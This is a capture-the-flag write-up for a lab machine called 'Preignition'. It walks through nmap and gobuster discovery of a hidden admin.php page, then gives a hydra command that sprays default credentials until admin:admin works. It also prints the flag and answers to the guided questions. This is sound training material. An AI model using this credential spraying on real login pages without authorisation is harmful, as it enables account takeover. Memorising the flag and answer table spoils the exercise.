# Preignition

|            |                                                                                       |
|------------|---------------------------------------------------------------------------------------|
| Track      | Starting Point - Tier 0                                                               |
| Difficulty | Very Easy                                                                             |
| OS         | Linux                                                                                 |
| Tags       | Web, Custom Applications, Apache, Reconnaissance, Site Discovery, Default Credentials |
| Tools      | `nmap`, `gobuster`, `hydra`                                                           |

## Summary

A web host with a hidden `admin.php` page that accepts the `admin:admin`
default. The trick is that the box is named "Preignition" because the work
happens *before* the engine starts: dirbusting and credential spraying are
the whole solve. There's no exploit, just enumeration done correctly.

## Recon

```bash
nmap -sV -p 80 10.129.199.239
# 80/tcp open  http    nginx 1.14.2
```

## Discovery

```bash
gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://10.129.199.239 -x php
# /admin.php  (Status: 200) [Size: 999]
```

`admin.php` is a login form that posts `username` and `password` fields and
returns the string "Wrong username or password" on failure. That error string
is what we anchor `hydra` on.

## Spray

```bash
cat > wordlist.txt << 'EOF'
admin:password
root:root
root:admin
user:user
user:password
admin:admin
EOF

hydra -C wordlist.txt 10.129.199.239 http-post-form \
  "/admin.php:username=^USER^&password=^PASS^:Wrong username or password"
# [80][http-post-form] login: admin   password: admin
```

## Flag

Logging in as `admin:admin` returns the flag in the page body.

```
6483bee07c1c1d57f14e5b0717503c73
```

## References

- [Hydra POST form bruteforce tutorial](https://infinitelogins.com/2020/02/22/how-to-brute-force-websites-using-hydra/)

## Guided Tasks

| # | Question | Answer |
|---|----------|--------|
| 1 | Directory Brute-forcing is a technique used to check a lot of paths on a web server to find hidden pages. Which is another name for this? | dir busting |
| 2 | What switch do we use for nmap's scan to specify that we want to perform version detection? | -sV |
| 3 | What does Nmap report is the service identified as running on port 80/tcp? | http |
| 4 | What server name and version of service is running on port 80/tcp? | nginx 1.14.2 |
| 5 | What switch do we use to specify to Gobuster we want to perform dir busting specifically? | dir |
| 6 | When using gobuster to dir bust, what switch do we add to make sure it finds PHP pages? | -x php |
| 7 | What page is found during our dir busting activities? | admin.php |
| 8 | What is the HTTP status code reported by Gobuster for the discovered page? | 200 |
